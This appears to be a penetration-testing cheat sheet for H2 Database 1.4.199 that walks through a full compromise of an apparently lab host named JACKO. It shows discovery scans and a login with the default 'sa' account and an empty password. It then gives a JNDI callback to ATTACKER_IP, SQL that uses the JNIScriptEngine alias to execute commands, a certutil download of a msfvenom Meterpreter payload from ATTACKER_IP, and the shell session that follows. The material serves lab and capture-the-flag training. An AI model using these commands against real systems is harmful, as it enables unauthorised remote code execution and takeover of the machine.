# H2 Database

H2 Database can expose a web console on TCP `8082` and a database service on TCP `9092`. H2 `1.4.199` can be abused for command execution through the console.

## Discovery

```bash
nmap -sC -sV TARGET
# 80/tcp   open  http  Microsoft IIS httpd 10.0
# http-title: H2 Database Engine (redirect)
# 8082/tcp open  http  H2 database http console
# http-title: H2 Console
```

Full port scans may show the H2 TCP service:

```text
9092/tcp open  XmlIpcRegSvc?
Remote connections to this server are not allowed
org.h2.jdbc.JdbcSQLNonTransientConnectionException
```

Useful documentation paths:

```text
http://TARGET/html/main.html
http://TARGET/html/tutorial.html
http://TARGET/html/features.html
http://TARGET/html/quickstart.html
```

## Console Login

Browse to the H2 console:

```text
http://TARGET:8082/login.jsp
```

The console may be prefilled with the `sa` user and no password. Use the default values and connect.

After login, check the version in the left pane:

```text
H2 1.4.199 (2019-03-13)
```

## JNDI Callback Check

Set the driver class to:

```text
javax.naming.InitialContext
```

Set the JDBC URL to an attacker-controlled LDAP listener:

```text
ldap://ATTACKER_IP:1387/hello
```

Confirm the target connects back before continuing:

```bash
nc -nlvp 1387
# connect to [ATTACKER_IP] from TARGET
```

## JNI Code Execution

Exploit-DB `49384` can enable `JNIScriptEngine.eval` command execution in H2 `1.4.199`.

After the exploit setup, create the alias and execute a command:

```sql
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("ping -n 4 ATTACKER_IP").getInputStream()).useDelimiter("\\Z").next()');
```

Confirm execution with ICMP:

```bash
sudo tcpdump -i tun0 icmp
```

## Reverse Shell

Create a Meterpreter payload and handler:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=80 -f exe -o met.exe

msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
set LPORT 80
set ExitOnSession false
run -j
```

Use H2 command execution to download and run it:

```sql
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -f http://ATTACKER_IP:8000/met.exe C:\\Windows\\Temp\\met.exe").getInputStream()).useDelimiter("\\Z").next()');

CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:\\Windows\\Temp\\met.exe").getInputStream()).useDelimiter("\\Z").next()');
```

Successful access:

```text
Meterpreter session opened
Computer        : JACKO
OS              : Windows 10 1909 (10.0 Build 18363).
Architecture    : x64
Domain          : WORKGROUP
Meterpreter     : x64/windows

meterpreter > shell
C:\Program Files (x86)\H2\service>whoami
jacko\tony
```

## References

- https://www.exploit-db.com/exploits/49384
- https://github.com/advisories/GHSA-h376-j262-vhq6
